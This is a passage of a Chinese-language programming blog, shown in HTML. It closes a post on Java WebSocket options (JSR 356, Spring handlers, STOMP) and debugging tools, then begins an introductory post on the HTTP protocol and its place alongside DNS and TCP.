反序列化逻辑（省略）</span></span><br><span class="line">        <span class="comment">// 从 message.getPayload() (byte[]) 反序列化为 targetClass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.convertFromInternal(message, targetClass, conversionHint);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">convertToInternal</span><span class="params">(Object payload, MessageHeaders headers, Object conversionHint)</span> &#123;</span><br><span class="line">        <span class="comment">// 序列化逻辑</span></span><br><span class="line">        <span class="comment">// 将 payload (Protobuf 对象) 序列化为 byte[]</span></span><br><span class="line">        <span class="keyword">return</span> ((GeneratedMessageV3) payload).toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在 WebSocket 配置中注册转换器：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">configureMessageConverters</span><span class="params">(List&lt;MessageConverter&gt; messageConverters)</span> &#123;</span><br><span class="line">    messageConverters.add(<span class="keyword">new</span> <span class="title class_">ProtobufMessageConverter</span>());</span><br><span class="line">    <span class="comment">// 返回 false 以保留 Spring 默认的转换器 (如 Jackson2JsonMessageConverter)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h1 id="七、总结与展望"><a href="#七、总结与展望" class="headerlink" title="七、总结与展望"></a>七、总结与展望</h1><h2 id="1-技术选型指南"><a href="#1-技术选型指南" class="headerlink" title="1. 技术选型指南"></a>1. 技术选型指南</h2><p>在 Java 生态中，实现 WebSocket 有多种层次的抽象。选择哪一种技术取决于你的项目需求、团队熟悉度、以及对未来扩展性的预期。下面是三种主流方案的选型对比。</p>
<h3 id="1-1-何时使用-JSR-356-Java-原生-API-？"><a href="#1-1-何时使用-JSR-356-Java-原生-API-？" class="headerlink" title="1.1 何时使用 JSR 356 (Java 原生 API)？"></a>1.1 何时使用 JSR 356 (Java 原生 API)？</h3><p><strong>一句话总结：当你不使用 Spring 框架，或者你需要对 WebSocket 协议进行“像素级”的底层控制时。</strong></p>
<ul>
<li><strong>核心特征：</strong><ul>
<li><strong>标准规范：</strong> 作为 Java EE 的一部分，它保证了在不同实现了该规范的应用服务器（Tomcat, Jetty, Undertow 等）之间的可移植性。</li>
<li><strong>轻量级：</strong> 无需任何额外的框架依赖，非常轻量。</li>
<li><strong>最大控制权：</strong> 你可以直接操作 <code>Session</code>、处理 <code>Ping/Pong</code> 控制帧、自定义消息分片等，拥有对连接最底层的完全控制。</li>
</ul>
</li>
<li><strong>适用场景：</strong><ul>
<li><strong>非 Spring 环境：</strong> 在一个未使用 Spring 或 Spring Boot 的传统 Java Web 项目中。</li>
<li><strong>高度定制的协议：</strong> 当你需要实现一个完全自定义的、非 STOMP 的二进制或文本协议时。</li>
<li><strong>极限性能压榨：</strong> 在某些需要极致优化内存和 CPU 的场景下，你希望避免任何框架开销，并手动管理所有资源。</li>
<li><strong>构建 WebSocket 框架或代理：</strong> 如果你的目标是开发一个基于 WebSocket 的中间件或库，直接使用标准 API 是最合适的。</li>
</ul>
</li>
<li><strong>局限性：</strong><ul>
<li><strong>所有事情都得自己做：</strong> 你需要手动管理 Session 列表、实现用户与 Session 的映射、编写消息广播&#x2F;群发&#x2F;单发的路由逻辑、手动实现心跳检测和重连策略。工作量巨大且容易出错。</li>
<li><strong>与 Spring 生态脱节：</strong> 无法直接利用 Spring 的依赖注入、AOP、安全管理等便利特性。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-2-何时使用-Spring-原生-WebSocket-WebSocketHandler-？"><a href="#1-2-何时使用-Spring-原生-WebSocket-WebSocketHandler-？" class="headerlink" title="1.2 何时使用 Spring 原生 WebSocket (WebSocketHandler)？"></a>1.2 何时使用 Spring 原生 WebSocket (<code>WebSocketHandler</code>)？</h3><p><strong>一句话总结：当你需要一个简单的、事件驱动的 WebSocket 实现，并且希望与 Spring 生态无缝集成时。</strong></p>
<ul>
<li><strong>核心特征：</strong><ul>
<li><strong>Spring 生态集成：</strong> 完美融入 Spring，可以自由使用 <code>@Autowired</code> 注入任何 Bean。<code>WebSocketHandler</code> 本身就是一个 Spring Bean。</li>
<li><strong>事件驱动模型：</strong> 提供了清晰的生命周期方法，如 <code>afterConnectionEstablished</code>, <code>handleMessage</code>, <code>afterConnectionClosed</code>。逻辑清晰，易于理解。</li>
<li><strong>中间层抽象：</strong> 它隐藏了 JSR 356 的底层细节，但又不像 STOMP 那样引入完整的消息协议。你处理的是 <code>WebSocketMessage</code>，而不是更复杂的 STOMP 帧。</li>
</ul>
</li>
<li><strong>适用场景：</strong><ul>
<li><strong>简单的服务器推送 (Server-Push)：</strong> 例如，向客户端推送系统状态、股票行情、日志更新等，客户端主要是接收方。</li>
<li><strong>简单的请求-响应：</strong> 客户端发送一个请求，服务器处理后返回一个结果，没有复杂的路由需求。</li>
<li><strong>自定义协议原型：</strong> 你想在 Spring 环境中实现一个简单的自定义 JSON 协议，但又觉得 STOMP 太重。</li>
<li><strong>SockJS 兼容性：</strong> 当你需要利用 Spring 提供的 SockJS 后备方案来兼容不支持 WebSocket 的旧浏览器时。</li>
</ul>
</li>
<li><strong>局限性：</strong><ul>
<li><strong>缺少协议层支持：</strong> 你仍然需要自己定义消息的格式（例如，在 JSON 中包含 “type”, “payload” 字段）并手动解析和路由。</li>
<li><strong>广播&#x2F;订阅逻辑需自建：</strong> 仍然需要手动维护 Session 列表来实现向多个用户发送消息。</li>
<li><strong>无内置用户目标：</strong> 不支持像 STOMP 那样方便的 <code>/user/queue/private</code> 私有消息。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-3-何时使用-Spring-STOMP？"><a href="#1-3-何时使用-Spring-STOMP？" class="headerlink" title="1.3 何时使用 Spring + STOMP？"></a>1.3 何时使用 Spring + STOMP？</h3><p><strong>一句话总结：对于绝大多数需要复杂交互（如聊天、协作、通知）的现代 Web 应用，这应该是你的</strong>默认<strong>和</strong>首选<strong>方案。</strong></p>
<ul>
<li><strong>核心特征：</strong><ul>
<li><strong>完整的消息协议：</strong> STOMP 是一个成熟的、轻量级的消息协议。它定义了 <code>SUBSCRIBE</code>, <code>SEND</code>, <code>MESSAGE</code> 等命令，让通信变得结构化。</li>
<li><strong>面向消息的编程模型：</strong> 使用 <code>@MessageMapping</code> 和 <code>@SubscribeMapping</code>，就像使用 Spring MVC 的 <code>@RequestMapping</code> 一样自然，极大地提高了开发效率。</li>
<li><strong>内置路由和广播：</strong> 基于目标地址（Destination）的发布-订阅（Pub-Sub）模型。你只需要向一个主题（如 <code>/topic/news</code>）发送消息，所有订阅了该主题的客户端都会收到，无需手动遍历 Session。</li>
<li><strong>强大的用户私信：</strong> 内置的 <code>/user</code> 目标前缀可以轻松实现向特定用户发送消息，这是许多应用的核心需求。</li>
<li><strong>完美的横向扩展能力：</strong> 可以无缝地从内置的简单代理切换到外部消息代理（如 RabbitMQ, ActiveMQ），以支持多实例集群部署，这是企业级应用的关键。</li>
</ul>
</li>
<li><strong>适用场景：</strong><ul>
<li><strong>聊天室&#x2F;即时通讯（IM）</strong></li>
<li><strong>在线协作工具</strong>（如协同编辑、白板）</li>
<li><strong>实时通知系统</strong></li>
<li><strong>实时数据仪表盘</strong>（Dashboard）</li>
<li><strong>任何需要 Pub-Sub、点对点消息、且未来可能需要水平扩展的应用。</strong></li>
</ul>
</li>
<li><strong>局限性：</strong><ul>
<li><strong>有一定学习成本：</strong> 需要理解 STOMP 协议的基本概念（Destination, Frame, Broker 等）。</li>
<li><strong>协议开销：</strong> 相比原生 WebSocket，STOMP 帧会增加一些协议头的开销，但对于大多数应用来说，这种开销可以忽略不计，换来的是巨大的开发便利性和可扩展性。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-4-技术选型对比速查表"><a href="#1-4-技术选型对比速查表" class="headerlink" title="1.4 技术选型对比速查表"></a>1.4 技术选型对比速查表</h3><table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">JSR 356 (原生)</th>
<th align="left">Spring 原生 WebSocket</th>
<th align="left">Spring + STOMP (推荐)</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>抽象级别</strong></td>
<td align="left"><strong>底层</strong> (直接操作 Session 和帧)</td>
<td align="left"><strong>中层</strong> (事件驱动，消息对象)</td>
<td align="left"><strong>高层</strong> (消息协议，注解驱动)</td>
</tr>
<tr>
<td align="left"><strong>开发效率</strong></td>
<td align="left">低</td>
<td align="left">中</td>
<td align="left"><strong>高</strong></td>
</tr>
<tr>
<td align="left"><strong>功能完备性</strong></td>
<td align="left">基础</td>
<td align="left">中等</td>
<td align="left"><strong>非常完备</strong> (路由, 用户目标, 心跳…)</td>
</tr>
<tr>
<td align="left"><strong>横向扩展</strong></td>
<td align="left">困难 (需手动实现)</td>
<td align="left">困难 (需手动实现)</td>
<td align="left"><strong>简单</strong> (切换到外部 Broker)</td>
</tr>
<tr>
<td align="left"><strong>典型用例</strong></td>
<td align="left">非 Spring 环境，定制协议</td>
<td align="left">简单的服务器推送，简单请求响应</td>
<td align="left"><strong>聊天、通知、协作、任何复杂交互</strong></td>
</tr>
<tr>
<td align="left"><strong>推荐指数</strong></td>
<td align="left">★☆☆☆☆</td>
<td align="left">★★☆☆☆</td>
<td align="left">★★★★★</td>
</tr>
</tbody></table>
<hr>
<h2 id="2-常用调试工具"><a href="#2-常用调试工具" class="headerlink" title="2. 常用调试工具"></a>2. 常用调试工具</h2><p>调试 WebSocket 不像调试 HTTP 那样直观，因为连接是持久的，通信是异步的。幸运的是，我们有多种强大的工具来帮助我们窥探 WebSocket 的内部世界。</p>
<h3 id="2-1-浏览器开发者工具-Network-WS"><a href="#2-1-浏览器开发者工具-Network-WS" class="headerlink" title="2.1 浏览器开发者工具 (Network -&gt; WS)"></a>2.1 浏览器开发者工具 (Network -&gt; WS)</h3><p>这是最直接、最常用的前端 WebSocket 调试工具，每个现代浏览器（Chrome, Firefox, Edge, Safari）都内置了它。</p>
<ul>
<li><strong>如何找到它？</strong><ol>
<li>在你的网页上按 <code>F12</code> 或右键选择“检查”打开开发者工具。</li>
<li>切换到 <strong>Network (网络)</strong> 面板。</li>
<li>在筛选器中，点击 <strong>WS</strong> (WebSocket) 来过滤出 WebSocket 连接。</li>
<li>刷新页面或执行建立 WebSocket 连接的操作。</li>
</ol>
</li>
<li><strong>核心功能与解读：</strong><ol>
<li><strong>Headers (标头) 面板：</strong><ul>
<li><strong>General (常规):</strong> 显示请求 URL (<code>wss://...</code>)、请求方法（<code>GET</code>）和最重要的<strong>状态码 <code>101 Switching Protocols</code></strong>。如果不是 101，说明 WebSocket 握手失败了，你需要检查 URL、服务器配置或拦截器逻辑。</li>
<li><strong>Response Headers (响应标头):</strong> 确认服务器返回了 <code>Upgrade: websocket</code> 和 <code>Connection: Upgrade</code>。</li>
<li><strong>Request Headers (请求标头):</strong> 检查客户端是否正确发送了 <code>Upgrade: websocket</code>、<code>Connection: Upgrade</code> 以及重要的 <code>Sec-WebSocket-Key</code>。这也是检查 <code>Origin</code> 头和自定义认证头（如 <code>Authorization</code>）的地方。</li>
</ul>
</li>
<li><strong>Messages (消息&#x2F;帧) 面板：</strong><ul>
<li>这是<strong>最核心</strong>的调试区域。它实时显示客户端和服务器之间传输的所有数据帧。</li>
<li><strong>绿色向上箭头 (<code>↑</code>):</strong> 表示由客户端<strong>发送</strong>到服务器的消息。</li>
<li><strong>红色向下箭头 (<code>↓</code>):</strong> 表示由服务器<strong>接收</strong>到客户端的消息。</li>
<li><strong>Data (数据) 列：</strong> 显示消息的内容。如果内容是 JSON，通常可以直接展开查看。对于 STOMP，你会看到完整的 STOMP 帧，包括命令（<code>CONNECT</code>, <code>SUBSCRIBE</code>, <code>MESSAGE</code>）、头部和 Body。</li>
<li><strong>Time (时间) 列：</strong> 显示消息的时间戳，有助于分析延迟和消息顺序。</li>
<li><strong>筛选器：</strong> 你可以在顶部输入关键词来筛选特定的消息，这在消息流非常快时特别有用。</li>
</ul>
</li>
</ol>
</li>
<li><strong>调试技巧：</strong><ul>
<li><strong>握手失败：</strong> 首先检查 <code>Headers</code> 面板，确认状态码和请求&#x2F;响应头是否正确。检查控制台（Console）是否有相关的错误信息。</li>
<li><strong>消息未收到：</strong> 在 <code>Messages</code> 面板确认消息是否真的被发送或接收。检查 STOMP 帧的目标地址（<code>destination</code> header）是否正确。</li>
<li><strong>消息格式错误：</strong> 点击具体的消息行，查看原始数据，确认 JSON 格式是否正确，或者 STOMP 帧的结构是否符合规范。</li>
<li><strong>心跳观察：</strong> 如果配置了 STOMP 心跳，你会在 <code>Messages</code> 面板中看到周期性的换行符（<code>\n</code>）或 <code>MESSAGE</code> 帧（取决于代理实现），这可以用来确认心跳机制是否在正常工作。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-2-Postman-Apifox-的-WebSocket-测试功能"><a href="#2-2-Postman-Apifox-的-WebSocket-测试功能" class="headerlink" title="2.2 Postman &#x2F; Apifox 的 WebSocket 测试功能"></a>2.2 Postman &#x2F; Apifox 的 WebSocket 测试功能</h3><p>虽然浏览器是调试前端的好地方，但有时我们需要一个独立的、功能更强大的客户端来模拟各种场景或进行后端接口测试。Postman 和 Apifox 等 API 工具提供了出色的 WebSocket 测试支持。</p>
<ul>
<li><strong>核心优势：</strong><ul>
<li><strong>独立于前端：</strong> 无需编写任何前端代码，可以直接连接到 WebSocket 服务器，非常适合后端开发人员自测接口。</li>
<li><strong>强大的请求定制能力：</strong> 可以方便地设置 URL、自定义握手请求头（如 <code>Authorization</code> Token）、URL 参数等。</li>
<li><strong>保存和复用：</strong> 可以将 WebSocket 请求保存到集合中，方便团队协作和回归测试。</li>
<li><strong>清晰的消息流展示：</strong> 提供了独立的发送和接收消息面板，并且可以格式化显示 JSON 或其他格式。</li>
</ul>
</li>
<li><strong>使用方法 (以 Postman 为例):</strong><ol>
<li><strong>新建请求：</strong> 在 Postman 中，点击 “New”，然后选择 “WebSocket Request”。</li>
<li><strong>输入 URL：</strong> 在地址栏输入你的 WebSocket 端点 URL（例如 <code>ws://localhost:8080/ws</code>）。</li>
<li><strong>配置握手 (Handshake):</strong><ul>
<li>切换到 <strong>Headers</strong> 标签页。</li>
<li>添加必要的头信息，例如 <code>Authorization</code> <code>Bearer your-jwt-token</code>。</li>
</ul>
</li>
<li><strong>连接 (Connect):</strong> 点击 “Connect” 按钮。如果连接成功，下方会显示 “CONNECTED” 状态，并且 “Messages” 区域会被激活。</li>
<li><strong>发送&#x2F;接收消息 (Compose &amp; View):</strong><ul>
<li>在下方的 “Message” 输入框中编写你要发送的消息内容。</li>
<li>点击 “Send” 按钮。</li>
<li>你发送的消息和从服务器收到的消息都会按时间顺序显示在主窗口中，并用不同的颜色和图标区分方向。</li>
</ul>
</li>
<li><strong>断开连接 (Disconnect):</strong> 测试完成后，点击 “Disconnect” 关闭连接。</li>
</ol>
</li>
<li><strong>调试场景：</strong><ul>
<li><strong>后端接口测试：</strong> 在后端开发完一个 <code>@MessageMapping</code> 接口后，立即用 Postman&#x2F;Apifox 模拟客户端发送消息，验证接口逻辑是否正确，而不需要等待前端开发完成。</li>
<li><strong>异常场景模拟：</strong> 发送格式错误的消息、不合法的 STOMP 帧，测试服务器的异常处理能力 (<code>@MessageExceptionHandler</code>)。</li>
<li><strong>认证测试：</strong> 快速测试不同的 Token 或认证凭据是否能成功建立连接。</li>
<li><strong>性能&#x2F;压力测试：</strong> 某些工具的高级版本或插件支持编写脚本来模拟大量并发连接和消息，进行简单的压力测试。</li>
</ul>
</li>
</ul>
<p><strong>总结：</strong></p>
<ul>
<li><strong>浏览器开发者工具</strong> 是调试<strong>前端与后端集成</strong>时的首选，它真实反映了用户浏览器中的情况。</li>
<li><strong>Postman&#x2F;Apifox</strong> 则是<strong>后端开发和纯接口测试</strong>的利器，它将后端逻辑与前端界面完全解耦，让测试更纯粹、更高效。</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/17/Web%E5%8D%8F%E8%AE%AE%E6%9C%8D%E5%8A%A1%E5%99%A8/HTTP%E5%8D%8F%E8%AE%AE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冉丝堂">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="冉的技术宝典">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | 冉的技术宝典">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/17/Web%E5%8D%8F%E8%AE%AE%E6%9C%8D%E5%8A%A1%E5%99%A8/HTTP%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">HTTP协议</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-10-17 16:09:23" itemprop="dateCreated datePublished" datetime="2025-10-17T16:09:23+08:00">2025-10-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-20 12:15:14" itemprop="dateModified" datetime="2025-10-20T12:15:14+08:00">2025-10-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8/" itemprop="url" rel="index"><span itemprop="name">Web协议与服务器</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="一、HTTP-基础入门"><a href="#一、HTTP-基础入门" class="headerlink" title="一、HTTP 基础入门"></a>一、HTTP 基础入门</h1><h2 id="1-什么是-HTTP？"><a href="#1-什么是-HTTP？" class="headerlink" title="1. 什么是 HTTP？"></a>1. 什么是 HTTP？</h2><h3 id="1-1-HTTP-的全称：HyperText-Transfer-Protocol"><a href="#1-1-HTTP-的全称：HyperText-Transfer-Protocol" class="headerlink" title="1.1 HTTP 的全称：HyperText Transfer Protocol"></a>1.1 HTTP 的全称：HyperText Transfer Protocol</h3><p>HTTP 的全称是 <strong>HyperText Transfer Protocol</strong>，即“<strong>超文本传输协议</strong>”。我们可以把这个名字拆开来理解：</p>
<ul>
<li><strong>HyperText (超文本)</strong><ul>
<li>它不仅仅是普通的纯文本。超文本指的是包含<strong>超链接 (Hyperlink)</strong> 的文本，可以从一个文本跳转到另一个文本或资源。</li>
<li>我们今天所说的“超文本”已经是一个广义的概念，它包括了网页中的所有内容，如：文字、图片、音频、视频、CSS 样式、JavaScript 脚本等。<strong>HTML (超文本标记语言)</strong> 是创建超文本最核心的语言。</li>
</ul>
</li>
<li><strong>Transfer (传输)</strong><ul>
<li>指将数据从一个地方搬运到另一个地方的过程。在 Web 中，通常是从<strong>服务器 (Server)</strong> 传输到<strong>客户端 (Client)</strong>。</li>
</ul>
</li>
<li><strong>Protocol (协议)</strong><ul>
<li>结合我们上面对协议的定义，它就是用来规范“超文本传输”这个过程的一整套规则。</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>核心定义</strong>：将以上三部分组合起来，HTTP 的核心定义就非常清晰了：<strong>HTTP 是一个用于在万维网（World Wide Web）中，从 Web 服务器传输超文本资源到本地浏览器的传输协议。</strong></p>
</blockquote>
<p>简单来说，打开浏览器，输入一个网址（如 <code>www.google.com</code>）并按下回车时，浏览器就会使用 HTTP 协议，向谷歌的服务器发送一个“请求”，告诉它“我想要你的首页”；服务器收到请求后，同样使用 HTTP 协议，将首页的 HTML、CSS、图片等资源打包成一个“响应”，发送回浏览器。</p>
<hr>
<h3 id="1-2-HTTP-的诞生与使命：为-Web-而生"><a href="#1-2-HTTP-的诞生与使命：为-Web-而生" class="headerlink" title="1.2 HTTP 的诞生与使命：为 Web 而生"></a>1.2 HTTP 的诞生与使命：为 Web 而生</h3><p>HTTP 不是凭空出现的，它的诞生与<strong>万维网 (World Wide Web, WWW)</strong> 紧密相连。</p>
<ul>
<li><strong>背景</strong>：在 20 世纪 80 年代末，欧洲核子研究中心 (CERN) 的科学家们面临一个难题：研究资料和文档分散在世界各地不同的计算机上，查阅和分享极为不便。</li>
<li><strong>诞生</strong>：为了解决这个问题，英国科学家<strong>蒂姆·伯纳斯-李 (Tim Berners-Lee)</strong> 在 1989-1991 年间，发明了构建现代 Web 的三项核心技术：<ol>
<li><strong>HTML (HyperText Markup Language)</strong>：一种用于创建和组织网页内容的语言。</li>
<li><strong>URL (Uniform Resource Locator)</strong>：一种为互联网上每个资源提供唯一地址的方案，俗称“网址”。</li>
<li><strong>HTTP (HyperText Transfer Protocol)</strong>：一种用于获取这些资源的协议。</li>
</ol>
</li>
<li><strong>使命</strong>：<ul>
<li><strong>HTTP 的根本使命，就是作为万维网的信使和基石，实现全球范围内信息的自由流通和链接。</strong></li>
<li>它定义了一种简单、标准化的方式，让任何一个客户端（如浏览器）都可以向任何一个服务器请求任何一种资源（通过 URL 定位），并能正确地接收和解析它。</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>总结一下</strong>：HTTP 的出现，使得“点击一个链接，就能跳转到另一个页面”这个革命性的想法得以实现。它就像是 Web 世界的快递系统，负责根据你提供的地址（URL），将你想要的包裹（HTML、图片等超文本资源）准确无误地送到你的手中（浏览器）。没有 HTTP，就没有我们今天丰富多彩的互联网世界。</p>
</blockquote>
<hr>
<h2 id="2-HTTP-在网络世界中的位置"><a href="#2-HTTP-在网络世界中的位置" class="headerlink" title="2. HTTP 在网络世界中的位置"></a>2. HTTP 在网络世界中的位置</h2><p>我们在Java第八章的网络编程中介绍了网络分层模型，HTTP 协议位于模型的最顶端——<strong>应用层</strong>。</p>
<hr>
<h3 id="2-1-应用层协议的角色"><a href="#2-1-应用层协议的角色" class="headerlink" title="2.1 应用层协议的角色"></a>2.1 应用层协议的角色</h3><p>现在我们知道 HTTP 位于最高层的应用层，那么它的具体角色是什么？</p>
<ol>
<li><strong>定义“业务语义”</strong>：应用层协议不关心数据如何可靠传输（那是 TCP 的事），也不关心数据如何跨网络路由（那是 IP 的事）。它只关心**“我们这次通信是要干什么”**。<ul>
<li>HTTP 定义了 <code>GET</code>（获取资源）、<code>POST</code>（提交数据）等方法，这就是在定义业务目的。</li>
<li>SMTP 定义了 <code>MAIL FROM</code>（发件人）、<code>RCPT TO</code>（收件人）等命令，这是在定义邮件投递的业务。</li>
</ul>
</li>
<li><strong>规定数据格式</strong>：应用层协议明确规定了应用程序之间交换的报文（Message）应该长什么样。<ul>
<li>HTTP 规定了请求必须包含“请求行、请求头、请求体”，响应必须包含“状态行、响应头、响应体”。</li>
</ul>
</li>
<li><strong>服务于最终用户</strong>：应用层是唯一直接与用户（或用户使用的软件）交互的层。你点击浏览器的一个链接，就是触发了一个 HTTP 应用层协议的动作。</li>
</ol>
<blockquote>
<p><strong>一句话总结</strong>：HTTP 作为应用层协议，其角色就是<strong>专注于定义“浏览器”和“Web服务器”这对应用程序之间如何沟通、交换“超文本文档”这件事</strong>，而将底层的网络传输细节完全委托给 TCP&#x2F;IP 协议栈去处理。</p>
</blockquote>
<hr>
<h3 id="2-2-HTTP-与-TCP、DNS-的关系：一次完整的网页请求过程"><a href="#2-2-HTTP-与-TCP、DNS-的关系：一次完整的网页请求过程" class="headerlink" title="2.2 HTTP 与 TCP、DNS 的关系：一次完整的网页请求过程"></a>2.2 HTTP 与 TCP、DNS 的关系：一次完整的网页请求过程</h3><p>这是理解 HTTP 在网络中位置的最佳实践。让我们以你在浏览器地址栏输入 <code>http://www.example.com</code> 并按回车为例，看看发生了什么：</p>
<pre><code class="highlight mermaid">sequenceDiagram
    participant 用户
    participant 浏览器
    participant DNS服务器
    participant Web服务器

    %% 1. 【应用层】DNS 解析
    rect rgb(240, 248, 255)
        note over 用户, Web服务器: 1. 【应用层】DNS 解析
        用户 -&gt;&gt; 浏览器: 输入 www.example.com
        浏览器 -&gt;&gt; DNS服务器: [DNS] 查询 www.example.com 的 IP 地址
        note over 浏览器, DNS服务器: DNS 就像互联网的“电话本”
        DNS服务器 --&gt;&gt; 浏览器: [DNS] 返回 IP 地址 93.184.216.34
    end

    %% 2. 【传输层】建立 TCP 连接
    rect rgb(230, 245, 230)
        note over 用户, Web服务器: 2. 【传输层】建立 TCP 连接 (三次握手)
        note over 浏览器, Web服务器: 拨通电话，确认对方在线
        浏览器 -&gt;&gt; Web服务器: [TCP] SYN (请求建立连接)
        Web服务器 --&gt;&gt; 浏览器: [TCP] SYN/ACK (同意并请求建立连接)
        浏览器 -&gt;&gt; Web服务器: [TCP] ACK (确认连接)
    end

    %% 3. 【应用层】发送 HTTP 请求
    rect rgb(255, 245, 230)
        note over 用户, Web服务器: 3. 【应用层】发送 HTTP 请求
        浏览器 -&gt;&gt; Web服务器: [HTTP] GET / HTTP/1.1
        note right of 浏览器: Host: www.example.com&lt;br/&gt;User-Agent: ...
    end

    %% 4. 【服务器】处理请求并发送 HTTP 响应
    rect rgb(255, 235, 235)
        note over 用户, Web服务器: 4. 服务器处理 &amp; 发送 HTTP 响应
        activate Web服务器
        note over Web服务器: 解析请求，找到 index.html
        Web服务器 --&gt;&gt; 浏览器: [HTTP] 200 OK 响应
        note left of Web服务器: Content-Type: text/html&lt;br/&gt;...&lt;br/&gt;&lt;!doctype html&gt;...
        deactivate Web服务器
    end
    
    %% 5. 【传输层】关闭 TCP 连接
    rect rgb(230, 245, 230)
        note over 用户, Web服务器: 5. 【传输层】关闭 TCP 连接 (可选)
        alt 连接保持 (Connection: keep-alive)
            note over 浏览器, Web服务器: 连接被复用，等待后续请求
        else 关闭连接 (四次挥手)
            浏览器 -&gt;&gt; Web服务器: [TCP] FIN (请求关闭)
            Web服务器 --&gt;&gt; 浏览器: [TCP] ACK (确认)
            Web服务器 --&gt;&gt; 浏览器: [TCP] FIN (请求关闭)
            浏览器 -&gt;&gt; Web服务器: [TCP] ACK (确认)
        end
    end

    %% 6. 【应用层】浏览器渲染
    rect rgb(240, 248, 255)
        note over 用户, Web服务器: 6. 【应用层】浏览器渲染
        activate 浏览器
        浏览器 -&gt;&gt; 用户: 显示五彩斑斓的网页
        note over 浏览器: 解析 HTML, 渲染页面
        deactivate 浏览器
        note right of 浏览器: 如有 CSS/JS/图片, &lt;br/&gt;会重复步骤 3-5 获取资源
    end</code></pre>

<ol>
<li><p><strong>【应用层】DNS 解析</strong>：</p>
<ul>
<li>浏览器首先看到的是 <code>www.example.com</code> 这个<strong>域名</strong>。但计算机网络通信需要的是 <strong>IP 地址</strong>（比如 <code>93.184.216.34</code>）。</li>
<li>浏览器会向 <strong>DNS</strong> 服务器发起一个查询请求（DNS 本身也是一个应用层协议），询问“<code>www.example.com</code> 的 IP 地址是什么？”</li>
<li>DNS 服务器回答：“是 <code>93.184.216.34</code>”。</li>
<li><strong>角色</strong>：<strong>DNS 就像是互联网的“电话本”</strong>，负责将人类易记的域名转换成机器使用的 IP 地址。</li>
</ul>
</li>
<li><p><strong>【传输层】建立 TCP 连接</strong>：</p>
<ul>
<li>浏览器现在拿到了 IP 地址。HTTP 协议默认使用 80 端口。</li>
<li>浏览器会通过操作系统的 TCP 协议栈，向服务器 <code>93.184.216.34</code> 的 <code>80</code> 端口发起一个 TCP 连接请求。</li>
<li>这个过程会经历著名的“<strong>三次握手</strong>”（SYN -&gt; SYN&#x2F;ACK -&gt; ACK），以确保双方都准备好通信，建立一条可靠的连接通道。</li>
<li><strong>角色</strong>：<strong>TCP 就像是“拨通了对方的电话”</strong>，并确认对方在线，随时可以开始通话。</li>
</ul>
</li>
<li><p><strong>【应用层】发送 HTTP 请求</strong>：</p>
<ul>
<li><p>TCP 连接建立成功后，浏览器就可以开始“说话”了。</p>
</li>
<li><p>浏览器会按照 HTTP 协议定义的格式，构建一个<strong>请求报文</strong>，例如：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.example.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>浏览器将这个报文通过刚才建立好的 TCP 连接发送给服务器。</p>
</li>
</ul>
</li>
<li><p><strong>【服务器】处理请求并发送 HTTP 响应</strong>：</p>
<ul>
<li><p>Web 服务器在 <code>80</code> 端口上一直监听着。当它收到这个 HTTP 请求报文后，会进行解析。</p>
</li>
